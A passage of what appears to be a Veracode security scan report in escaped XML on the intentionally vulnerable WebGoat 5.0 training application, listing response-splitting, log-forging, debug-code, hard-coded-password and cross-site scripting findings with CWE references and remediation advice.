        variable request.getParameter(). The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameter.\r\n\r\nEscape, encode,
        or remove carriage return and line feed characters from user-supplied data
        before inclusion in HTTP response headers. Whenever possible, use a security
        library such as ESAPI that provides safe versions of addHeader(), etc. that
        will automatically remove unexpected carriage returns and line feeds and can
        be configured to use HTML entity encoding for non-alphanumeric data. Only
        write custom blacklisting code when absolutely necessary. Always validate
        user-supplied input to ensure that it conforms to the expected format, using
        centralized data validation routines when possible.\r\n\r\nReferences: \r\nCWE
        (http://cwe.mitre.org/data/definitions/113.html) \r\nOWASP (http://www.owasp.org/index.php/HTTP_Response_Splitting)
        \r\nWASC (http://webappsec.pbworks.com/HTTP-Response-Splitting)\r\n\r\n\"
        note=\"\" cweid=\"113\" remediationeffort=\"2\" exploitLevel=\"1\" categoryid=\"21\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"redirect_jsp.java\" line=\"43\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/General/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.General.redirect_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"62\"/>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of CRLF Sequences in
        HTTP Headers ('HTTP Response Splitting')\" count=\"1\" issueid=\"170\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.http.HttpServletResponse.addCookie\" description=\"This
        call to javax.servlet.http.HttpServletResponse.addCookie() contains an HTTP
        response splitting flaw. Writing unsanitized user-supplied input into an HTTP
        header allows an attacker to manipulate the HTTP response rendered by the
        browser, to inject additional headers or an entire response body into the
        response stream. Injecting headers can be used to trick various security mechanisms
        in browsers into allowing XSS style attacks. Injecting entire response bodies
        can not only cause XSS attacks to succeed but may even poison the cache of
        any intermediary proxies between the clients and the application server. The
        first argument to addCookie() contains tainted data from the variable cookies.
        The tainted data originated from an earlier call to javax.servlet.http.HttpServletRequest.getCookies.\r\n\r\nEscape,
        encode, or remove carriage return and line feed characters from user-supplied
        data before inclusion in HTTP response headers. Whenever possible, use a security
        library such as ESAPI that provides safe versions of addHeader(), etc. that
        will automatically remove unexpected carriage returns and line feeds and can
        be configured to use HTML entity encoding for non-alphanumeric data. Only
        write custom blacklisting code when absolutely necessary. Always validate
        user-supplied input to ensure that it conforms to the expected format, using
        centralized data validation routines when possible.\r\n\r\nReferences: \r\nCWE
        (http://cwe.mitre.org/data/definitions/113.html) \r\nOWASP (http://www.owasp.org/index.php/HTTP_Response_Splitting)
        \r\nWASC (http://webappsec.pbworks.com/HTTP-Response-Splitting)\r\n\r\n\"
        note=\"\" cweid=\"113\" remediationeffort=\"2\" exploitLevel=\"1\" categoryid=\"21\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"WebSession.java\" line=\"335\" sourcefilepath=\"org/owasp/webgoat/session/\"
        scope=\"org.owasp.webgoat.session.WebSession\" functionprototype=\"void eatCookies()\"
        functionrelativelocation=\"79\"/>\n</staticflaws>\n</cwe>\n<cwe cweid=\"117\"
        cwename=\"Improper Output Neutralization for Logs\" pcirelated=\"true\">\n<description>\n<text
        text=\"A function call could result in a log forging attack.  Writing unsanitized
        user-supplied data into a log file allows an attacker to forge log entries
        or inject malicious content into log files.  Corrupted log files can be used
        to cover an attacker's tracks or as a delivery mechanism for an attack on
        a log viewing or processing utility.  For example, if a web administrator
        uses a browser-based utility to review logs, a cross-site scripting attack
        might be possible.\"/>\n</description>\n<staticflaws>\n<flaw severity=\"3\"
        categoryname=\"Improper Output Neutralization for Logs\" count=\"1\" issueid=\"214\"
        module=\"WebGoat-5.0-with-jsp.war\" type=\"javax.servlet.GenericServlet.log\"
        description=\"This call to javax.servlet.GenericServlet.log() could result
        in a log forging attack. Writing unsanitized user-supplied data into a log
        file allows an attacker to forge log entries or inject malicious content into
        log files. Corrupted log files can be used to cover an attacker's tracks or
        as a delivery mechanism for an attack on a log viewing or processing utility.
        For example, if a web administrator uses a browser-based utility to review
        logs, a cross-site scripting attack might be possible. The first argument
        to log() contains tainted data from the variable output. The tainted data
        originated from an earlier call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid
        directly embedding user input in log files when possible. Sanitize user-supplied
        data used to construct log entries by using a safe logging mechanism such
        as the OWASP ESAPI Logger, which will automatically remove unexpected carriage
        returns and line feeds and can be configured to use HTML entity encoding for
        non-alphanumeric data. Only write custom blacklisting code when absolutely
        necessary. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/117.html) \r\nOWASP (http://www.owasp.org/index.php/Log_injection)
        \r\nWASC (http://webappsec.pbworks.com/Improper-Output-Handling)\r\n\r\n\"
        note=\"\" cweid=\"117\" remediationeffort=\"2\" exploitLevel=\"1\" categoryid=\"21\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"npp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"HammerHead.java\" line=\"306\" sourcefilepath=\"org/owasp/webgoat/\"
        scope=\"org.owasp.webgoat.HammerHead\" functionprototype=\"void log(javax.servlet.http.HttpServletRequest,
        java.lang.String)\" functionrelativelocation=\"84\"/>\n</staticflaws>\n</cwe>\n</category>\n<category
        categoryid=\"17\" categoryname=\"Code Quality\" pcirelated=\"false\">\n<desc>\n<para
        text=\"Code quality issues stem from failure to follow good coding practices
        and can lead to unpredictable behavior. These may include but are not limited
        to:\">\n<bulletitem text=\"Neglecting to remove debug code or dead code\"/>\n<bulletitem
        text=\"Improper resource management, such as using a pointer after it has
        been freed\"/>\n<bulletitem text=\"Using the incorrect operator to compare
        objects\"/>\n<bulletitem text=\"Failing to follow an API or framework specification\"/>\n<bulletitem
        text=\"Using a language feature or API in an unintended manner\"/>\n</para>\n<para
        text=\"While code quality flaws are generally less severe than other categories
        and usually are not directly exploitable, they may serve as indicators that
        developers are not following practices that increase the reliability and security
        of an application.  For an attacker, code quality issues may provide an opportunity
        to stress the application in unexpected ways.\"/>\n</desc>\n<recommendations>\n<para
        text=\"The wide variance of code quality issues makes it impractical to generalize
        how these issues should be addressed.  Refer to individual categories for
        specific recommendations. \"/>\n</recommendations>\n<cwe cweid=\"489\" cwename=\"Leftover
        Debug Code\" pcirelated=\"false\">\n<description>\n<text text=\"A method may
        be leftover debug code that creates an unintended entry point in a web application.
        \ Although this is an acceptable practice during product development, classes
        that are part of a production J2EE application should not define a main()
        method.  Whether this method can be remotely invoked depends on the configuration
        of the J2EE container and the application itself.\"/>\n</description>\n<staticflaws>\n<flaw
        severity=\"3\" categoryname=\"Leftover Debug Code\" count=\"1\" issueid=\"70\"
        module=\"WebGoat-5.0-with-jsp.war\" type=\"main\" description=\"The main()
        method may be leftover debug code that creates an unintended entry point in
        a web application. Although this is an acceptable practice during product
        development, classes that are part of a production J2EE application should
        not define a main() method. Whether this method can be remotely invoked depends
        on the configuration of the J2EE container and the application itself.\r\n\r\nEliminate
        unnecessary entry points in deployed web applications to reduce the attack
        surface. Ensure that this is not a backdoor disguised as debugging functionality.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/489.html)\r\n\r\n\" note=\"\"
        cweid=\"489\" remediationeffort=\"2\" exploitLevel=\"-1\" categoryid=\"17\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"CreateDB.java\" line=\"53\" sourcefilepath=\"org/owasp/webgoat/session/\"
        scope=\"org.owasp.webgoat.session.CreateDB\" functionprototype=\"void main(java.lang.String
        \ [])\" functionrelativelocation=\"0\"/>\n<flaw severity=\"3\" categoryname=\"Leftover
        Debug Code\" count=\"1\" issueid=\"42\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"main\" description=\"The main() method may be leftover debug code that
        creates an unintended entry point in a web application. Although this is an
        acceptable practice during product development, classes that are part of a
        production J2EE application should not define a main() method. Whether this
        method can be remotely invoked depends on the configuration of the J2EE container
        and the application itself.\r\n\r\nEliminate unnecessary entry points in deployed
        web applications to reduce the attack surface. Ensure that this is not a backdoor
        disguised as debugging functionality.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/489.html)\r\n\r\n\"
        note=\"\" cweid=\"489\" remediationeffort=\"2\" exploitLevel=\"-1\" categoryid=\"17\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"Encoding.java\" line=\"744\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.Encoding\" functionprototype=\"void main(java.lang.String
        \ [])\" functionrelativelocation=\"0\"/>\n<flaw severity=\"3\" categoryname=\"Leftover
        Debug Code\" count=\"1\" issueid=\"243\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"main\" description=\"The main() method may be leftover debug code that
        creates an unintended entry point in a web application. Although this is an
        acceptable practice during product development, classes that are part of a
        production J2EE application should not define a main() method. Whether this
        method can be remotely invoked depends on the configuration of the J2EE container
        and the application itself.\r\n\r\nEliminate unnecessary entry points in deployed
        web applications to reduce the attack surface. Ensure that this is not a backdoor
        disguised as debugging functionality.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/489.html)\r\n\r\n\"
        note=\"\" cweid=\"489\" remediationeffort=\"2\" exploitLevel=\"-1\" categoryid=\"17\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"Exec.java\" line=\"505\" sourcefilepath=\"org/owasp/webgoat/util/\"
        scope=\"org.owasp.webgoat.util.Exec\" functionprototype=\"void main(java.lang.String
        \ [])\" functionrelativelocation=\"0\"/>\n<flaw severity=\"3\" categoryname=\"Leftover
        Debug Code\" count=\"1\" issueid=\"133\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"main\" description=\"The main() method may be leftover debug code that
        creates an unintended entry point in a web application. Although this is an
        acceptable practice during product development, classes that are part of a
        production J2EE application should not define a main() method. Whether this
        method can be remotely invoked depends on the configuration of the J2EE container
        and the application itself.\r\n\r\nEliminate unnecessary entry points in deployed
        web applications to reduce the attack surface. Ensure that this is not a backdoor
        disguised as debugging functionality.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/489.html)\r\n\r\n\"
        note=\"\" cweid=\"489\" remediationeffort=\"2\" exploitLevel=\"-1\" categoryid=\"17\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"WebgoatProperties.java\" line=\"114\" sourcefilepath=\"org/owasp/webgoat/session/\"
        scope=\"org.owasp.webgoat.session.WebgoatProperties\" functionprototype=\"void
        main(java.lang.String  [])\" functionrelativelocation=\"0\"/>\n</staticflaws>\n</cwe>\n</category>\n<category
        categoryid=\"10\" categoryname=\"Credentials Management\" pcirelated=\"true\">\n<desc>\n<para
        text=\"Improper management of credentials, such as usernames and passwords,
        may compromise system security.  In particular, storing passwords in plaintext
        or hard-coding passwords directly into application code are design issues
        that cannot be easily remedied.  Not only does embedding a password allow
        all of the project's developers to view the password, it also makes fixing
        the problem extremely difficult.  Once the code is in production, the password
        cannot be changed without patching the software.  If a hard-coded password
        is compromised in a commercial product, all deployed instances may be vulnerable
        to attack, putting customers at risk.\"/>\n<para text=\"One variation on hard-coding
        plaintext passwords is to hard-code a constant string which is the result
        of a cryptographic one-way hash.  For example, instead of storing the word
        &quot;secret,&quot; the application stores an MD5 hash of the word.  This
        is a common mechanism for obscuring hard-coded passwords from casual viewing
        but does not significantly reduce risk.  However, using cryptographic hashes
        for data stored outside the application code can be an effective practice.\"/>\n</desc>\n<recommendations>\n<para
        text=\"Avoid storing passwords in easily accessible locations, and never store
        any type of sensitive data in plaintext.  Avoid using hard-coded usernames,
        passwords, or hash constants whenever possible, particularly in relation to
        security-critical components.   Store passwords out-of-band from the application
        code.  Follow best practices for protecting credentials stored in alternate
        locations such as configuration or properties files.\"/>\n</recommendations>\n<cwe
        cweid=\"256\" cwename=\"Plaintext Storage of a Password\" pcirelated=\"true\">\n<description>\n<text
        text=\"A method reads and/or stores sensitive information in plaintext, making
        the data more susceptible to compromise.\"/>\n</description>\n<staticflaws>\n<flaw
        severity=\"3\" categoryname=\"Plaintext Storage of a Password\" count=\"1\"
        issueid=\"223\" module=\"WebGoat-5.0-with-jsp.war\" type=\"java.sql.DriverManager.getConnection\"
        description=\"The java.sql.DriverManager.getConnection() method reads and/or
        stores sensitive information in plaintext, making the data more susceptible
        to compromise.\r\n\r\nNever store sensitive data in plaintext. Consider using
        cryptographic hashes as an alternative to plaintext.\r\n\r\nReferences: \r\nCWE
        (http://cwe.mitre.org/data/definitions/256.html)\r\n\r\n\" note=\"\" cweid=\"256\"
        remediationeffort=\"4\" exploitLevel=\"0\" categoryid=\"10\" pcirelated=\"true\"
        date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"DatabaseUtilities.java\" line=\"97\" sourcefilepath=\"org/owasp/webgoat/session/\"
        scope=\"org.owasp.webgoat.session.DatabaseUtilities\" functionprototype=\"java.sql.Connection
        makeConnection(void)\" functionrelativelocation=\"72\"/>\n</staticflaws>\n</cwe>\n<cwe
        cweid=\"259\" cwename=\"Use of Hard-coded Password\" pcirelated=\"true\">\n<description>\n<text
        text=\"A method uses a hard-coded password that may compromise system security
        in a way that cannot be easily remedied.  The use of a hard-coded password
        significantly increases the possibility that the account being protected will
        be compromised.  Moreover, the password cannot be changed without patching
        the software.  If a hard-coded password is compromised in a commercial product,
        all deployed instances may be vulnerable to attack.\"/>\n</description>\n<staticflaws>\n<flaw
        severity=\"3\" categoryname=\"Use of Hard-coded Password\" count=\"1\" issueid=\"28\"
        module=\"WebGoat-5.0-with-jsp.war\" type=\"java.sql.DriverManager.getConnection\"
        description=\"The java.sql.DriverManager.getConnection() method uses a hard-coded
        password that may compromise system security in a way that cannot be easily
        remedied. The use of a hard-coded password significantly increases the possibility
        that the account being protected will be compromised. Moreover, the password
        cannot be changed without patching the software. If a hard-coded password
        is compromised in a commercial product, all deployed instances may be vulnerable
        to attack.\r\n\r\nStore passwords out-of-band from the application code. Follow
        best practices for protecting credentials stored in locations such as configuration
        or properties files.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/259.html)\r\n\r\n\"
        note=\"\" cweid=\"259\" remediationeffort=\"4\" exploitLevel=\"1\" categoryid=\"10\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"CreateDB.java\" line=\"69\" sourcefilepath=\"org/owasp/webgoat/session/\"
        scope=\"org.owasp.webgoat.session.CreateDB\" functionprototype=\"void main(java.lang.String
        \ [])\" functionrelativelocation=\"16\"/>\n</staticflaws>\n</cwe>\n</category>\n<category
        categoryid=\"20\" categoryname=\"Cross-Site Scripting\" pcirelated=\"true\">\n<desc>\n<para
        text=\"Cross-site scripting (XSS) attacks occur when an attacker uses a web
        application to send malicious code, generally in the form of a browser side
        script, to a different end user. Flaws that allow these attacks to succeed
        occur whenever a web application uses untrusted data in the output it generates
        without validating or encoding it.  XSS vulnerabilities are commonly exploited
        to steal or manipulate cookies, modify presentation of content, and compromise
        sensitive information, with new attack vectors being discovered on a regular
        basis.  XSS is also commonly referred to as HTML injection.\"/>\n<para text=\"XSS
        vulnerabilities can be either persistent or transient (often referred to as
        stored and reflected, respectively).  In a persistent XSS vulnerability, the
        injected code is stored by the application, for example within a blog comment
        or message board.  The attack occurs whenever a victim views the page containing
        the malicious script.  In a transient XSS vulnerability, the injected code
        is included directly in the HTTP request.  These attacks are often carried
        out via malicious URLs sent via email or another website and requires the
        victim to browse to that link.  The consequence of an XSS attack to a victim
        is the same regardless of whether it is persistent or transient; however,
        persistent XSS vulnerabilities are likely to affect a greater number of victims
        due to its delivery mechanism.\"/>\n</desc>\n<recommendations>\n<para text=\"Several
        techniques can be used to prevent XSS attacks. These techniques complement
        each other and address security at different points in the application. Using
        multiple techniques provides defense-in-depth and minimizes the likelihood
        of a XSS vulnerability.\">\n<bulletitem text=\"Use output filtering to sanitize
        all output generated from user-supplied input, selecting the appropriate method
        of encoding based on the use case of the untrusted data.  For example, if
        the data is being written to the body of an HTML page, use HTML entity encoding.
        \ However, if the data is being used to construct generated Javascript or
        if it is consumed by client-side methods that may interpret it as code (a
        common technique in Web 2.0 applications), additional restrictions may be
        necessary beyond simple HTML encoding.\"/>\n<bulletitem text=\"Validate user-supplied
        input using positive filters (white lists) to ensure that it conforms to the
        expected format, using centralized data validation routines when possible.
        \"/>\n<bulletitem text=\"Do not permit users to include HTML content in posts,
        notes, or other data that will be displayed by the application.  If users
        are permitted to include HTML tags, then carefully limit access to specific
        elements or attributes, and use strict validation filters to prevent abuse.\"/>\n</para>\n</recommendations>\n<cwe
        cweid=\"83\" cwename=\"Improper Neutralization of Script in Attributes in
        a Web Page\" pcirelated=\"true\">\n<description>\n<text text=\"The application
        does not filter text or other data for potentially malicious HTML content.
        This enables an attacker to craft arbitrary HTML content. This vulnerability
        typically requires that an attacker be able to submit JavaScript &lt;script&gt;
        tags as part of a field that is re-displayed to one or more users. The &lt;script&gt;
        tag contains instructions that are executed in a user's web browser, not on
        the web application server. JavaScript functions can be used to write raw
        HTML, read cookie values, pull JavaScript code from a third-party web server,
        or send data to a third-party web server.\"/>\n</description>\n<dynamicflaws>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script in Attributes
        in a Web Page\" count=\"1\" issueid=\"277\" module=\"dynamic_analysis\" type=\"Improper
        Neutralization of Script in Attributes in a Web Page\" description=\"The application
        does not filter text or other data for potentially malicious HTML content.
        This enables an attacker to craft arbitrary HTML content. This vulnerability
        typically requires that an attacker be able to submit JavaScript &lt;script&gt;
        tags as part of a field that is re-displayed to one or more users. The &lt;script&gt;
        tag contains instructions that are executed in a user's web browser, not on
        the web application server. JavaScript functions can be used to write raw
        HTML, read cookie values, pull JavaScript code from a third-party web server,
        or send data to a third-party web server.\r\n\r\nCross-site scripting and
        HTML injection attacks can be defeated by applying robust input validation
        filters for all data received from the web browser. Do not permit users to
        include HTML content in posts, notes, or other data that will be displayed
        by the application. If users are permitted to include HTML entities, then
        limit access to specific elements or attributes. Use the programming language's
        built-in routines to remove potentially malicious characters.\r\n\r\n\r\nCWE
        (http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=83) \r\nOWASP (http://www.owasp.org/index.php/Cross_Site_Scripting)\r\n\r\n\"
        note=\"\" cweid=\"83\" remediationeffort=\"3\" categoryid=\"20\" pcirelated=\"true\"
        date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        url=\"http://10.0.4.89:8080/WebGoat/attack\"/>\n<flaw severity=\"3\" categoryname=\"Improper
        Neutralization of Script in Attributes in a Web Page\" count=\"1\" issueid=\"278\"
        module=\"dynamic_analysis\" type=\"Improper Neutralization of Script in Attributes
        in a Web Page\" description=\"The application does not filter text or other
        data for potentially malicious HTML content. This enables an attacker to craft
        arbitrary HTML content. This vulnerability typically requires that an attacker
        be able to submit JavaScript &lt;script&gt; tags as part of a field that is
        re-displayed to one or more users. The &lt;script&gt; tag contains instructions
        that are executed in a user's web browser, not on the web application server.
        JavaScript functions can be used to write raw HTML, read cookie values, pull
        JavaScript code from a third-party web server, or send data to a third-party
        web server.\r\n\r\nCross-site scripting and HTML injection attacks can be
        defeated by applying robust input validation filters for all data received
        from the web browser. Do not permit users to include HTML content in posts,
        notes, or other data that will be displayed by the application. If users are
        permitted to include HTML entities, then limit access to specific elements
        or attributes. Use the programming language's built-in routines to remove
        potentially malicious characters.\r\n\r\n\r\nCWE (http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=83)
        \r\nOWASP (http://www.owasp.org/index.php/Cross_Site_Scripting)\r\n\r\n\"
        note=\"\" cweid=\"83\" remediationeffort=\"3\" categoryid=\"20\" pcirelated=\"true\"
        date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        url=\"http://10.0.4.89:8080/WebGoat/css/menu.css\"/>\n<flaw severity=\"3\"
        categoryname=\"Improper Neutralization of Script in Attributes in a Web Page\"
        count=\"1\" issueid=\"279\" module=\"dynamic_analysis\" type=\"Improper Neutralization
        of Script in Attributes in a Web Page\" description=\"The application does
        not filter text or other data for potentially malicious HTML content. This
        enables an attacker to craft arbitrary HTML content. This vulnerability typically
        requires that an attacker be able to submit JavaScript &lt;script&gt; tags
        as part of a field that is re-displayed to one or more users. The &lt;script&gt;
        tag contains instructions that are executed in a user's web browser, not on
        the web application server. JavaScript functions can be used to write raw
        HTML, read cookie values, pull JavaScript code from a third-party web server,
        or send data to a third-party web server.\r\n\r\nCross-site scripting and
        HTML injection attacks can be defeated by applying robust input validation
        filters for all data received from the web browser. Do not permit users to
        include HTML content in posts, notes, or other data that will be displayed
        by the application. If users are permitted to include HTML entities, then
        limit access to specific elements or attributes. Use the programming language's
        built-in routines to remove potentially malicious characters.\r\n\r\n\r\nCWE
        (http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=83) \r\nOWASP (http://www.owasp.org/index.php/Cross_Site_Scripting)\r\n\r\n\"
        note=\"\" cweid=\"83\" remediationeffort=\"3\" categoryid=\"20\" pcirelated=\"true\"
        date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        url=\"http://10.0.4.89:8080/WebGoat/images/logos/owasp.jpg\"/>\n<flaw severity=\"3\"
        categoryname=\"Improper Neutralization of Script in Attributes in a Web Page\"
        count=\"1\" issueid=\"280\" module=\"dynamic_analysis\" type=\"Improper Neutralization
        of Script in Attributes in a Web Page\" description=\"The application does
        not filter text or other data for potentially malicious HTML content. This
        enables an attacker to craft arbitrary HTML content. This vulnerability typically
        requires that an attacker be able to submit JavaScript &lt;script&gt; tags
        as part of a field that is re-displayed to one or more users. The &lt;script&gt;
        tag contains instructions that are executed in a user's web browser, not on
        the web application server. JavaScript functions can be used to write raw
        HTML, read cookie values, pull JavaScript code from a third-party web server,
        or send data to a third-party web server.\r\n\r\nCross-site scripting and
        HTML injection attacks can be defeated by applying robust input validation
        filters for all data received from the web browser. Do not permit users to
        include HTML content in posts, notes, or other data that will be displayed
        by the application. If users are permitted to include HTML entities, then
        limit access to specific elements or attributes. Use the programming language's
        built-in routines to remove potentially malicious characters.\r\n\r\n\r\nCWE
        (http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=83) \r\nOWASP (http://www.owasp.org/index.php/Cross_Site_Scripting)\r\n\r\n\"
        note=\"\" cweid=\"83\" remediationeffort=\"3\" categoryid=\"20\" pcirelated=\"true\"
        date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        url=\"http://10.0.4.89:8080/WebGoat/javascript/javascript.js\"/>\n<flaw severity=\"3\"
        categoryname=\"Improper Neutralization of Script in Attributes in a Web Page\"
        count=\"1\" issueid=\"281\" module=\"dynamic_analysis\" type=\"Improper Neutralization
        of Script in Attributes in a Web Page\" description=\"The application does
        not filter text or other data for potentially malicious HTML content. This
        enables an attacker to craft arbitrary HTML content. This vulnerability typically
        requires that an attacker be able to submit JavaScript &lt;script&gt; tags
        as part of a field that is re-displayed to one or more users. The &lt;script&gt;
        tag contains instructions that are executed in a user's web browser, not on
        the web application server. JavaScript functions can be used to write raw
        HTML, read cookie values, pull JavaScript code from a third-party web server,
        or send data to a third-party web server.\r\n\r\nCross-site scripting and
        HTML injection attacks can be defeated by applying robust input validation
        filters for all data received from the web browser. Do not permit users to
        include HTML content in posts, notes, or other data that will be displayed
        by the application. If users are permitted to include HTML entities, then
        limit access to specific elements or attributes. Use the programming language's
        built-in routines to remove potentially malicious characters.\r\n\r\n\r\nCWE
        (http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=83) \r\nOWASP (http://www.owasp.org/index.php/Cross_Site_Scripting)\r\n\r\n\"
        note=\"\" cweid=\"83\" remediationeffort=\"3\" categoryid=\"20\" pcirelated=\"true\"
        date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        url=\"http://10.0.4.89:8080/WebGoat/lesson_solutions/CommandInjection_files/image005.png\"/>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script in Attributes
        in a Web Page\" count=\"1\" issueid=\"284\" module=\"dynamic_analysis\" type=\"Improper
        Neutralization of Script in Attributes in a Web Page\" description=\"The application
        does not filter text or other data for potentially malicious HTML content.
        This enables an attacker to craft arbitrary HTML content. This vulnerability
        typically requires that an attacker be able to submit JavaScript &lt;script&gt;
        tags as part of a field that is re-displayed to one or more users. The &lt;script&gt;
        tag contains instructions that are executed in a user's web browser, not on
        the web application server. JavaScript functions can be used to write raw
        HTML, read cookie values, pull JavaScript code from a third-party web server,
        or send data to a third-party web server.\r\n\r\nCross-site scripting and
        HTML injection attacks can be defeated by applying robust input validation
        filters for all data received from the web browser. Do not permit users to
        include HTML content in posts, notes, or other data that will be displayed
        by the application. If users are permitted to include HTML entities, then
        limit access to specific elements or attributes. Use the programming language's
        built-in routines to remove potentially malicious characters.\r\n\r\n\r\nCWE
        (http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=83) \r\nOWASP (http://www.owasp.org/index.php/Cross_Site_Scripting)\r\n\r\n\"
        note=\"\" cweid=\"83\" remediationeffort=\"3\" categoryid=\"20\" pcirelated=\"true\"
        date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        url=\"http://10.0.4.89:8080/WebGoat/lesson_solutions/formate.css\"/>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script in Attributes
        in a Web Page\" count=\"1\" issueid=\"282\" module=\"dynamic_analysis\" type=\"Improper
        Neutralization of Script in Attributes in a Web Page\" description=\"The application
        does not filter text or other data for potentially malicious HTML content.
        This enables an attacker to craft arbitrary HTML content. This vulnerability
        typically requires that an attacker be able to submit JavaScript &lt;script&gt;
        tags as part of a field that is re-displayed to one or more users. The &lt;script&gt;
        tag contains instructions that are executed in a user's web browser, not on
        the web application server. JavaScript functions can be used to write raw
        HTML, read cookie values, pull JavaScript code from a third-party web server,
        or send data to a third-party web server.\r\n\r\nCross-site scripting and
        HTML injection attacks can be defeated by applying robust input validation
        filters for all data received from the web browser. Do not permit users to
        include HTML content in posts, notes, or other data that will be displayed
        by the application. If users are permitted to include HTML entities, then
        limit access to specific elements or attributes. Use the programming language's
        built-in routines to remove potentially malicious characters.\r\n\r\n\r\nCWE
        (http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=83) \r\nOWASP (http://www.owasp.org/index.php/Cross_Site_Scripting)\r\n\r\n\"
        note=\"\" cweid=\"83\" remediationeffort=\"3\" categoryid=\"20\" pcirelated=\"true\"
        date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        url=\"http://10.0.4.89:8080/WebGoat/lesson_solutions/HttpSplitting_files/filelist.xml\"/>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script in Attributes
        in a Web Page\" count=\"1\" issueid=\"283\" module=\"dynamic_analysis\" type=\"Improper
        Neutralization of Script in Attributes in a Web Page\" description=\"The application
        does not filter text or other data for potentially malicious HTML content.
        This enables an attacker to craft arbitrary HTML content. This vulnerability
        typically requires that an attacker be able to submit JavaScript &lt;script&gt;
        tags as part of a field that is re-displayed to one or more users. The &lt;script&gt;
        tag contains instructions that are executed in a user's web browser, not on
        the web application server. JavaScript functions can be used to write raw
        HTML, read cookie values, pull JavaScript code from a third-party web server,
        or send data to a third-party web server.\r\n\r\nCross-site scripting and
        HTML injection attacks can be defeated by applying robust input validation
        filters for all data received from the web browser. Do not permit users to
        include HTML content in posts, notes, or other data that will be displayed
        by the application. If users are permitted to include HTML entities, then
        limit access to specific elements or attributes. Use the programming language's
        built-in routines to remove potentially malicious characters.\r\n\r\n\r\nCWE
        (http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=83) \r\nOWASP (http://www.owasp.org/index.php/Cross_Site_Scripting)\r\n\r\n\"
